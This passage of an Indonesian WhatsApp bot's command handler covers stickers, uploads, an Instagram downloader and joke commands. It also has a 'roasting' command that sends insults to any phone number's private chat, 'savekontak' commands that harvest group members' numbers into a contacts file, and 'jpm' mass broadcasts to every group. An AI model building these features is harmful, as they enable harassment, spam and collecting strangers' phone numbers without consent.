      }
      if (araara.length === 0) {
        throw new Error('No valid images found')
      }
      const msgii = await generateWAMessageFromContent(m.chat, {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: araara
              })
            })
          }
        }
      }, { userJid: m.sender, quoted: m })

      await client.relayMessage(m.chat, msgii.message, {
        messageId: msgii.key.id
      })
      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    } catch (error) {
      console.error('Error:', error)
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
      return xreply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
    }
  }
  break

  case 'cogan': {
    try {
      const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
      const data = await res.json();
      if (!Array.isArray(data)) return xreply('Data tidak valid.');
      const randomImage = data[Math.floor(Math.random() * data.length)];
      client.sendMessage(m.chat, {
        image: { url: randomImage },
        caption: 'Nih cogan buat kamu :v'
      }, { quoted: m });
    } catch (err) {
      console.error(err);
      xreply('Gagal mengambil data cogan.');
    }
  }
  break

  /// ───────────── [ 𝖱𝗈𝖺𝗌𝗍𝗂𝗇𝗀 ] ──────────── ///
  case 'roasting': {
    let orang = m.mentionedJid && m.mentionedJid[0]
      ? m.mentionedJid[0]
      : text
        ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        : null;
    if (!orang) return xreply('Tag orang atau ketik nomornya, contoh: *.roast @user* atau *.roast 628xxxx*');
    let ppthumb;
    try {
      ppthumb = await client.profilePictureUrl(orang, 'image');
    } catch {
      ppthumb = global.image.menu;
    }
    const roastList = [
      `@user, kadang gue mikir, kamu tuh kayak sinyal 1 bar di tengah hutan—nggak berguna tapi selalu muncul pas gak dibutuhin.`,
      `@user, lu tuh kayak charger 15 ribuan—bisa dipake, tapi bikin panas dan ngerusak semuanya.`,
      `@user, kalau otak kamu dijual di marketplace, kemungkinan besar masuk kategori "rusak parah, dijual kiloan".`,
      `@user, kamu kayak WiFi tetangga—kelihatan tapi nggak bisa dipake. Ngeselin banget!`,
      `@user, kalau ngomong tuh kayak lagu remix—banyak noise tapi gak jelas maksudnya.`,
      `@user, kamu itu bukan toxic sih, tapi lebih kayak limbah beracun yang seharusnya dikarantina 40 tahun.`,
      `@user, gaya hidupmu tuh kayak skripsi anak semester 9—jalan di tempat, banyak alasan, hasil nol.`,
      `@user, lu tuh kayak CAPTCHA yang gak bisa ditebak, cuma nyusahin orang doang.`,
      `@user, kalau jadi karakter game, kamu tuh pasti NPC yang ngasih misi gagal dari awal.`,
      `@user, jujur aja... tiap kamu buka mulut, IQ ruangan turun 10 poin.`,
      `@user, muka kamu tuh kayak error 404—nggak ketemu solusinya, bikin stres.`,
      `@user, kalau jadi hewan, kamu pasti masuk kategori hewan mitos, soalnya gak ada yang ngerti eksistensimu.`,
      `@user, kamu tuh kayak alarm jam 5 pagi pas libur—gak penting, cuma ganggu tidur orang.`,
      `@user, IQ kamu tuh kayak ping server merah—tinggi banget tapi gak berguna.`,
      `@user, lu tuh kayak file corrupt—dibuka bikin kesel, dihapus sayang kuota.`,
      `@user, kalau ada lomba jadi beban, lu pasti juara bertahan 5 tahun berturut-turut.`,
      `@user, jokes kamu tuh kayak sinetron azab—maksa, basi, tapi tetep aja nongol.`,
      `@user, ngomong sama lu tuh kayak ngisi CAPTCHA terus gagal, muter-muter gak jelas.`,
      `@user, kalau ketawa lu direkam, bisa dipake buat usir tuyul.`,
      `@user, gaya kamu tuh kayak intro YouTuber 2012—lebay, norak, dan pengen skip.`,
      `@user, lu tuh kayak charger rusak—bisa nyambung tapi nyetrum perasaan orang.`,
      `@user, setiap kamu muncul, vibes-nya kayak error di Windows—tiba-tiba, bikin panik, dan nyusahin.`,
      `@user, kamu itu kayak sandi WiFi yang udah nggak aktif—masih diinget, tapi udah gak guna.`,
      `@user, kamu tuh kayak grup WA keluarga—rame, tapi gak ada faedahnya.`,
      `@user, kalau jadi app, kamu pasti butuh update tiap hari tapi tetep nge-lag.`,
      `@user, tampangmu kayak file zip, kecil tapi isinya berat semua.`,
      `@user, vibes kamu kayak baterai 1%—mau dimanfaatin aja orang males.`,
      `@user, kalau lu jadi sinetron, pasti judulnya *"Anak Durhaka Gagal Update Otak."*`,
      `@user, lu tuh kayak file download-an gagal—udah nunggu lama, eh error juga.`,
      `@user, otak lu kayak server gratis—down terus tiap dibutuhin.`,
      `@user, kalo jadi emoji, lu tuh pasti "buffering".`,
      `@user, IQ lu kayak koneksi WiFi publik—semua bisa pake, tapi nggak bisa diandalkan.`,
      `@user, tiap kali lu ngomong, grammar dunia ikut menangis.`,
      `@user, kalo jadi film, lu dapet rating 1 bintang dari netizen dan makhluk halus.`,
      `@user, jokes kamu tuh kayak status Facebook 2010—garing, jadul, dan bikin malu.`
    ];
    const roastText = roastList[Math.floor(Math.random() * roastList.length)].replace(/@user/g, `@${orang.split('@')[0]}`);
    try {
      await client.sendMessage(orang, {
        text: roastText,
        mentions: [orang],
        contextInfo: {
          externalAdReply: {
            title: `${botname} - ${global.versi || '2.00'} ⚙️`,
            body: `⏱ Runtime: ${runtime(process.uptime())}`,
            thumbnailUrl: ppthumb,
            sourceUrl: `${global.source}`
          }
        }
      });
    } catch (error) {
      console.error("Error saat mengirim pesan:", error);
      xreply('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
    }
  }
  break

  /// ───────────── [ 𝖲𝗍𝗂𝖼𝗄𝖾𝗋 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
  case "s":
  case "sticker":
  case "stiker": {
    if (!/image|video/gi.test(mime)) return xreply(example("dengan kirim media"))
    if (/video/gi.test(mime) && qmsg.seconds > 15) return xreply("Durasi vidio maksimal 15 detik!")
    var image = await client.downloadAndSaveMediaMessage(qmsg)
    await client.sendAsSticker(m.chat, image, m, { packname: global.packname })
    await fs.unlinkSync(image)
  }
  break

  case "swm":
  case "stickerwm":
  case "stikerwm":
  case "wm": {
    if (!text) return xreply(example("namamu dengan kirim media"))
    if (!/image|video/gi.test(mime)) return xreply(example("namamu dengan kirim media"))
    if (/video/gi.test(mime) && qmsg.seconds > 15) return xreply("Durasi vidio maksimal 15 detik!")
    var image = await client.downloadAndSaveMediaMessage(qmsg)
    await client.sendAsSticker(m.chat, image, m, { packname: text })
    await fs.unlinkSync(image)
  }
  break

  case "emojimix": {
    if (!text) return xreply(example('😀|😍'))
    if (!text.split("|")) return xreply(example('😀|😍'))
    let [e1, e2] = text.split("|")
    let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
    let videoBuffer = await getBuffer(brat)
    try {
      await client.sendAsSticker(m.chat, videoBuffer, m, { packname: global.packname })
    } catch { }
  }
  break

  case "emojigif": {
    if (!text) return xreply(example('😍'))
    try {
      const axios = require('axios');
      let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
      let response = await axios.get(brat, { responseType: "arraybuffer" });
      let videoBuffer = response.data;
      let stickerBuffer = await client.sendAsSticker(m.chat, videoBuffer, m, {
        packname: global.packname,
      })
    } catch (err) {
      console.error("Error:", err);
    }
  }
  break

  case 'smeme':
  case 'stickermeme':
  case 'stickmeme': {
    if (!/image/.test(mime))
      return reply(`Balas foto dengan caption *${prefix + command} teks_atas|teks_bawah*`);
    client.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } })
    let [atas, bawah] = text.split("|");
    atas = atas || "-";
    bawah = bawah || "-";

    let buffer = await client.downloadAndSaveMediaMessage(qmsg);
    if (!buffer) return reply("❌ Gagal mengunduh media!");

    const FormData = require("form-data");
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, "image.jpg");

    let up = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    let catboxUrl = up.data;
    if (!catboxUrl.startsWith("http"))
      return reply("❌ Gagal upload ke Catbox!");

    let apiUrl = `https://api-faa.my.id/faa/smeme?text_atas=${encodeURIComponent(
      atas
    )}&text_bawah=${encodeURIComponent(
      bawah
    )}&background=${encodeURIComponent(catboxUrl)}`;

    let hasil = await axios.get(apiUrl, {
      responseType: "arraybuffer",
    });

    await client.sendAsSticker(m.chat, hasil.data, m, {
      packname: global.packname,
      author: m.pushName
    });
    client.sendMessage(m.chat, { react: { text: `🤓`, key: m.key } })
  }
  break;

  case "brat": {
    if (!text) return reply(example('teksnya'))
    const axios = require('axios');
    let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`
    let response = await axios.get(brat, { responseType: "arraybuffer" })
    let videoBuffer = response.data;
    try {
      await client.sendAsSticker(m.chat, videoBuffer, m, { packname: global.packname })
    } catch { }
  }
  break

  case "bratvid": {
    if (!text) return reply(`Contoh: ${prefix + command} hai`)

    const words = text.split(" ")
    const tempDir = path.join(process.cwd(), 'lib')
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
    const framePaths = []

    try {
      for (let i = 0; i < words.length; i++) {
        const currentText = words.slice(0, i + 1).join(" ")

        const res = await axios.get(
          `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
          responseType: "arraybuffer"
        }
        ).catch((e) => e.response)

        const framePath = path.join(tempDir, `frame${i}.mp4`)
        fs.writeFileSync(framePath, res.data)
        framePaths.push(framePath)
      }

      const fileListPath = path.join(tempDir, "filelist.txt")
      let fileListContent = ""

      for (let i = 0; i < framePaths.length; i++) {
        fileListContent += `file '${framePaths[i]}'\n`
        fileListContent += `duration 0.7\n`
      }

      fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
      fileListContent += `duration 2\n`

      fs.writeFileSync(fileListPath, fileListContent)
      const outputVideoPath = path.join(tempDir, "output.mp4")
      execSync(
        `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
      )

      await client.sendAsSticker(m.chat, outputVideoPath, m, {
        packname: 'Made By Cy,bro botz',
        author: `\nDibuat Oleh ${m.pushName}`
      })

      framePaths.forEach((frame) => {
        if (fs.existsSync(frame)) fs.unlinkSync(frame)
      })
      if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
      if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
    } catch (e) {
      console.error(e)
      xreply('Terjadi kesalahan')
    }
  }
  break

  case "bratgambar2": {
    if (!text) {
      const colorList = `
*Daftar Kode Warna Umum*

*Dasar:*
• Hitam: #000000
• Putih: #FFFFFF
• Merah: #FF0000
• Hijau: #00FF00
• Biru: #0000FF
• Kuning: #FFFF00
• Cyan: #00FFFF
• Magenta: #FF00FF

*Lainnya:*
• Abu: #808080
• Navy: #000080
• Orange: #FFA500
• Pink: #FFC0CB
• Emas: #FFD700

Format: 
*bratimg2 teks | fontColor | bgColor*
Contoh:
bratimg2 Halo World | #FF0000 | #FFFFFF
`.trim();
      return xreply(colorList);
    }
    const axios = require('axios');
    const [teks, fontColor, bgColor] = text.split("|").map(v => v?.trim());
    const finalText = teks || 'Yubi 😗😗';
    const finalFontColor = fontColor || '#000000';
    const finalBgColor = bgColor || '#FFFFFF';
    const apiUrl = `https://fastrestapis.fasturl.cloud/maker/brat/advanced?text=${encodeURIComponent(finalText)}&font=Arial&fontSize=auto&fontPosition=justify&fontBlur=3&fontColor=${encodeURIComponent(finalFontColor)}&bgColor=${encodeURIComponent(finalBgColor)}`;

    try {
      let response = await axios.get(apiUrl, { responseType: "arraybuffer" });
      let buffer = response.data;
      await client.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
    } catch (err) {
      console.error("Error bratimg2:", err);
      xreply('Gagal membuat sticker. Coba lagi nanti.');
    }
  }
  break

  case "tourl": {
    if (!/image/.test(mime)) return xreply(example("dengan kirim/reply foto"))
    let media = await client.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('pixhost.to');
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'MISTER-MD-md.jpg');

    let teks = directLink.toString()
    await client.sendMessage(m.chat, { text: teks }, { quoted: m })
    await fs.unlinkSync(media)
  }
  break

  case 'tourl2': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!/webp/.test(mimetype)) {
      client.sendMessage(m.chat, {
        react: {
          text: '⏰',
          key: m.key,
        }
      });

      try {
        const media = await q.download?.();
        const fileSizeInBytes = media.length;
        const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
        const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
        const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        let ext = mimetype.split('/')[1] || '';
        if (ext) ext = `.${ext}`;
        form.append('fileToUpload', media, `file${ext}`);
        const res = await fetch('https://catbox.moe/user/api.php', {
          method: 'POST',
          body: form
        });
        const result = await res.text();
        const url = result.trim();
        const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
        await client.sendMessage(m.chat, { text: caption }, { quoted: m });
      } catch (e) {
        console.error(e);
        xreply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
      }
    } else {
      Reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${prefix + command}*`);
    }
  }
  break

  case 'tourl3': {
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';

    if (!mime) return xreply('Kirim atau reply file/gambar yang mau diupload!');

    await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
      const buffer = await q.download();
      const fileName = q.msg?.fileName || `file_${Date.now()}.${mime.split('/')[1] || 'bin'}`;

      const formData = new FormData();
      for (let i = 0; i < 10; i++) {
        const fieldName = `file_${i}_`;
        if (i === 0) {
          formData.append(fieldName, new Blob([buffer], { type: mime }), fileName);
        } else {
          formData.append(fieldName, '');
        }
      }
      formData.append('submitr', '[ رفع الملفات ]');

      const res = await fetch('https://top4top.io/index.php', {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36'
        },
        body: formData
      });

      const html = await res.text();
      const linkRegex = /<a\s+onclick="window\.open\(this\.href,'_blank'\);return false;"\s+href="(.*?)"/gi;
      const matches = [...html.matchAll(linkRegex)];
      const links = matches.map(match => match[1]);

      if (!links.length) throw new Error('Gagal mendapatkan link upload.');

      const now = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
      await xreply(`🔗 *Link*:\n${links.join('\n')}`);

      await client.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
      await client.sendMessage(m.chat, { react: { text: '', key: m.key } });
      xreply(`Gagal!\n${e.message}`);
    }
  }
  break

  /// ───────────── [ 𝖨𝖦 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
  case "ig":
  case "instagram": {
    try {
      if (!text) return xreply(`Contoh:\n${prefix + command} https://www.instagram.com/reel/DaH1GCUvqVn/?igsh=xxxxx`)

      if (!text.includes("instagram.com"))
        return xreply("❌ Link Instagram tidak valid!")

      await xreply("⏳ Sedang mengambil media Instagram...")

      const axios = require("axios")

      const api = `https://api.azbry.com/api/download/instagram?url=${encodeURIComponent(text)}`
      const { data } = await axios.get(api)

      if (!data.status) {
        return xreply("❌ Gagal mengambil media Instagram.")
      }

      let caption = `乂 *INSTAGRAM DOWNLOADER*

📦 *Type:* ${data.type || "-"}
🎬 *Total Video:* ${data.videos?.length || 0}
🖼️ *Total Foto:* ${data.images?.length || 0}

> Powered By Azbry API`

      if (data.thumb) {
        await client.sendMessage(m.chat, {
          image: { url: data.thumb },
          caption
        }, { quoted: m })
      }

      if (data.videos && data.videos.length > 0) {
        for (let video of data.videos) {
          await client.sendMessage(m.chat, {
            video: { url: video },
            caption: "✅ Video Instagram berhasil diunduh."
          }, { quoted: m })
        }
      }

      if (data.images && data.images.length > 0) {
        for (let img of data.images) {
          await client.sendMessage(m.chat, {
            image: { url: img },
            caption: "✅ Foto Instagram berhasil diunduh."
          }, { quoted: m })
        }
      }

      if ((!data.videos || data.videos.length === 0) &&
        (!data.images || data.images.length === 0)) {
        return xreply("❌ Media tidak ditemukan.")
      }

    } catch (e) {
      console.log(e)
      xreply(`❌ Error\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖢𝖾𝗄 𝖪𝗁𝗈𝖽𝖺𝗆 ] ──────────── ///
  case 'cekkhodam':
  case 'cekkodam': {
    if (!text) return reply("ketik nama mu")

    const khodam = pickRandom([
      "Kaleng Cat Avian",
      "Pipa Rucika",
      "King Hitam",
      "Lemari dua Pintu",
      "Kacang Hijau",
      "Kulkas mini",
      "Burung beo",
      "Air",
      "Api",
      "Batu",
      "Magnet",
      "Sempak",
      "Botol Tupperware",
      "Badut Mixue",
      "Sabun GIV",
      "Sandal Swallow",
      "Jarjit",
      "Ijat",
      "Fizi",
      "Mail",
      "Ehsan",
      "Upin",
      "Ipin",
      "sungut lele",
      "Tok Dalang",
      "Opah",
      "Opet",
      "Alul",
      "Pak Vinsen",
      "Maman Resing",
      "Pak RT",
      "Admin ETI",
      "Bung Towel",
      "Lumpia Basah",
      "Bjorka",
      "Hacker",
      "Martabak Manis",
      "Baso Tahu",
      "Tahu Gejrot",
      "Dimsum",
      "Seblak",
      "Aromanis",
      "Gelembung sabun",
      "Kuda",
      "Seblak Ceker",
      "Telor Gulung",
      "Tahu Aci",
      "Tempe Mendoan",
      "Nasi Kucing",
      "Kue Cubit",
      "Tahu Sumedang",
      "Nasi Uduk",
      "Wedang Ronde",
      "Kerupuk Udang",
      "Cilok",
      "Cilung",
      "Kue Sus",
      "Jasuke",
      "Seblak Makaroni",
      "Sate Padang",
      "Sayur Asem",
      "Kromboloni",
      "Marmut Pink",
      "Belalang Mullet",
      "Kucing Oren",
      "Lintah Terbang",
      "Singa Paddle Pop",
      "Macan Cisewu",
      "Vario Mber",
      "Beat Mber",
      "Supra Geter",
      "Oli Samping",
      "Knalpot Racing",
      "Jus Stroberi",
      "Jus Alpukat",
      "Alpukat Kocok",
      "Es Kopyor",
      "Es Jeruk",
      "@adiwajshing/baileys",
      "chalk",
      "gradient-string",
      "@adiwajshing",
      "d-scrape",
      "undefined",
      "cannot read properties",
      "performance-now",
      "os",
      "node-fetch",
      "form-data",
      "axios",
      "util",
      "fs-extra",
      "scrape-primbon",
      "child_process",
      "emoji-regex",
      "check-disk-space",
      "perf_hooks",
      "moment-timezone",
      "cheerio",
      "fs",
      "process",
      "require( . . . )",
      "import ... from ...",
      "rate-overlimit",
      "Cappucino Cincau",
      "Jasjus Melon",
      "Teajus Apel",
      "Pop ice Mangga",
      "Teajus Gulabatu",
      "Air Selokan",
      "Air Kobokan",
      "TV Tabung",
      "Keran Air",
      "Tutup Panci",
      "Kotak Amal",
      "Tutup Termos",
      "Tutup Botol",
      "Kresek Item",
      "Kepala Casan",
      "Ban Serep",
      "Kursi Lipat",
      "Kursi Goyang",
      "Kulit Pisang",
      "Warung Madura",
      "Gorong-gorong",
    ])
    const response = `Khodam mu adalah: *${khodam}*`
    xreply(response)
  }
  break

  /// ───────────── [ 𝖢𝖾𝗄 𝖦𝖺𝗇𝗍𝖾𝗇𝗀/𝖢𝖺𝗇𝗍𝗂𝗄 ] ──────────── ///
  case 'cekganteng':
  case 'cekcantik': {
    const teks = text ? text.trim() : ''
    let targetJid
    let targetName
    if (m.mentionedJid && m.mentionedJid.length > 0) {
      targetJid = m.mentionedJid[0]
      targetName = await client.getName(targetJid)
    } else if (/^\d{5,}$/.test(teks)) {
      targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
      targetName = await client.getName(targetJid).catch(() => teks)
    } else if (teks) {
      targetJid = m.sender
      targetName = teks
    } else {
      targetJid = m.sender
      targetName = await client.getName(m.sender)
    }
    const score = Math.floor(Math.random() * 100) + 1
    let komentar, emoji
    if (command == 'cekganteng') {
      if (score >= 90) {
        komentar = 'Gantengnya overload! Bikin cewek-cewek auto salfok!'
        emoji = '🔥👑💯'
      } else if (score >= 75) {
        komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!'
        emoji = '✨🧸💘'
      } else if (score >= 60) {
        komentar = 'Lumayanlah, bisa jadi cover boy majalah sekolah.'
        emoji = '😎👍'
      } else if (score >= 40) {
        komentar = 'Masih bisa ganteng... asal pake lighting dan filter 10 lapis.'
        emoji = '🤔😅📸'
      } else if (score >= 20) {
        komentar = 'Gantengnya kayak sinyal 1 bar di hutan.'
        emoji = '📵🌲😂'
      } else {
        komentar = 'Waduh... Gantengnya disembunyiin kali ya?'
        emoji = '🥲💀👻'
      }
      const result = `*Cek Ganteng Untuk:* ${targetName}\n\n` +
        `*Nilai Ganteng:* *${score}/100* ${emoji}\n\n` +
        `*Komentar:* ${komentar}`
      client.sendMessage(m.chat, {
        text: result,
        mentions: [targetJid],
      }, { quoted: m })
    } else if (command == 'cekcantik') {
      if (score >= 90) {
        komentar = 'Kecantikannya bikin bunga iri dan rembulan minder.'
        emoji = '🌷✨🌙'
      } else if (score >= 75) {
        komentar = 'Manisnya kayak senja di tepi pantai, adem banget dipandang.'
        emoji = '🌅🍬🥰'
      } else if (score >= 60) {
        komentar = 'Pesonanya sederhana tapi ngena, kayak kopi di pagi hari.'
        emoji = '☕🌼😊'
      } else if (score >= 40) {
        komentar = 'Cantik sih... tapi kayak koneksi WiFi, kadang ada kadang hilang.'
        emoji = '📶🤏🥲'
      } else if (score >= 20) {
        komentar = 'Mungkin cantiknya perlu di-update ke versi terbaru.'
        emoji = '💻🤖🫣'
      } else {
        komentar = 'Kecantikannya kayak teka-teki, masih misteri.'
        emoji = '🕵️‍♀️❓🌑'
      }
      const result = `*Cek Cantik Untuk:* ${targetName}\n\n` +
        `*Skor Kecantikan:* *${score}/100* ${emoji}\n\n` +
        `*Komentar:* ${komentar}`
      client.sendMessage(m.chat, {
        text: result,
        mentions: [targetJid],
      }, { quoted: m })
    }
  }
  break

  /// ───────────── [ 𝖣𝖾𝗅𝖾𝗍𝖾 & 𝖱𝖾𝖺𝖽𝗆𝗈𝗋𝖾 ] ──────────── ///
  case "delete":
  case "del": {
    if (!isOwner) return reply(mess.owner)
    if (!m.quoted) return xreply("reply pesannya")

    await client.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: Boolean(m.quoted.fromMe),
        id: m.quoted.id,
        participant: m.quoted.sender
      }
    })
  }
  break

  case 'readmore': {
    if (!text.includes('|')) return xreply('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
    const more = String.fromCharCode(8206).repeat(4001)
    const teks = text.split('|').join(more)
    xreply(teks)
  }
  break

  /// ───────────── [ 𝖲𝖺𝗏𝖾 𝖪𝗈𝗇𝗍𝖺𝗄 ] ──────────── ///
  case "savekontak2": {
    if (!isOwner) return reply(mess.owner)
    if (!m.isGroup) return reply(mess.group)
    let res = await m.metadata
    const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    for (let mem of halls) {
      if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
        contacts.push(mem)
        fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
      }
    }
    try {
      const uniqueContacts = [...new Set(contacts)]
      const vcardContent = uniqueContacts.map((contact, index) => {
        const vcard = [
          "BEGIN:VCARD",
          "VERSION:3.0",
          `FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
          `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
          "END:VCARD",
          "",
        ].join("\n")
        return vcard
      }).join("")
      fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
    } catch (err) {
      xreply(err.toString())
    } finally {
      if (m.chat !== m.sender) await xreply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
      await client.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
      contacts.splice(0, contacts.length)
      await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
      await fs.writeFileSync("./library/database/contacts.vcf", "")
    }
  }
  break

  case "savekontak": {
    if (!isOwner) return reply(mess.owner)
    if (!text) return xreply(example("idgrupnya"))
    let res = await client.groupMetadata(text)
    const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    for (let mem of halls) {
      if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
        contacts.push(mem)
        fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
      }
    }
    try {
      const uniqueContacts = [...new Set(contacts)]
      const vcardContent = uniqueContacts.map((contact, index) => {
        const vcard = [
          "BEGIN:VCARD",
          "VERSION:3.0",
          `FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
          `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
          "END:VCARD",
          "",
        ].join("\n")
        return vcard
      }).join("")
      fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
    } catch (err) {
      xreply(err.toString())
    } finally {
      if (m.chat !== m.sender) await xreply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
      await client.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
      contacts.splice(0, contacts.length)
      await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
      await fs.writeFileSync("./library/database/contacts.vcf", "")
    }
  }
  break

  /// ───────────── [ 𝖩𝖯𝖬 (𝖩𝖺𝗌𝖺 𝖯𝖾𝗌𝖺𝗇 𝖬𝖺𝗌𝗌𝖺𝗅) ] ──────────── ///
  case "jpm3": {
    if (!isOwner) return reply(mess.owner);

    const teks = getJpmText();
    if (!teks) return xreply(example("teks dengan mengirim foto"));
    if (!/^image\//i.test(getJpmMime())) return xreply(example("teks dengan mengirim foto"));

    let mediaPath;
    try {
      mediaPath = await client.downloadAndSaveMediaMessage(qmsg);
      const imageBuffer = await fs.promises.readFile(mediaPath);
      if (!imageBuffer.length) throw new Error("File gambar kosong atau gagal dibaca.");

      await broadcastJpmGroups("JPM3 (foto/testimoni)", () => ({
        footer: `© 2026 ${botname}`,
        buttons: [
          {
            buttonId: ".owner",
            buttonText: { displayText: "Owner" },
            type: 1
          }
        ],
        headerType: 1,
        viewOnce: true,
        image: imageBuffer,
        caption: `\n${teks}\n`,
        contextInfo: {
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: global.namaSaluran
          }
        }
      }));
    } catch (error) {
      console.error("[JPM3 ERROR]", error?.stack || error);
      await xreply(`❌ JPM3 gagal diproses: ${error?.message || error}`);
    } finally {
      if (mediaPath) {
        await fs.promises.unlink(mediaPath).catch(() => {});
      }
    }
  }
  break;

  case "jpm": {
    if (!isOwner) return reply(mess.owner);

    const teks = getJpmText();
    if (!teks) return xreply(example("teksnya atau reply pesan teks"));

    try {
      await broadcastJpmGroups("JPM (teks)", () => ({ text: teks }));
    } catch (error) {
      console.error("[JPM ERROR]", error?.stack || error);
      await xreply(`❌ JPM gagal diproses: ${error?.message || error}`);
    }
  }
  break;

  case "jpm2": {
    if (!isOwner) return reply(mess.owner);

    const teks = getJpmText();
    if (!teks) return xreply(example("teks dengan mengirim video"));
    if (!/^video\//i.test(getJpmMime())) return xreply(example("teks dengan mengirim video"));

    let mediaPath;
    try {
      mediaPath = await client.downloadAndSaveMediaMessage(qmsg);
      const videoBuffer = await fs.promises.readFile(mediaPath);
      if (!videoBuffer.length) throw new Error("File video kosong atau gagal dibaca.");

      await broadcastJpmGroups("JPM2 (video)", () => ({
        video: videoBuffer,
        caption: teks
      }));
    } catch (error) {
      console.error("[JPM2 ERROR]", error?.stack || error);
      await xreply(`❌ JPM2 gagal diproses: ${error?.message || error}`);
    } finally {
      if (mediaPath) {
        await fs.promises.unlink(mediaPath).catch(() => {});
      }
    }
  }
  break;

  /// ───────────── [ 𝖦𝗋𝗈𝗎𝗉 𝖬𝖺𝗇𝖺𝗀𝖾𝗆𝖾𝗇𝗍 ] ──────────── ///
  case "tagall": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (!text) return xreply(example("pesannya"))
    let teks = text + "\n\n"
    let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
    await member.forEach((e) => {
      teks += `@${e.split("@")[0]}\n`
    })
    await client.sendMessage(m.chat, { text: teks, mentions: [...member] }, { quoted: m })
  }
  break

  case "add": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (text) {
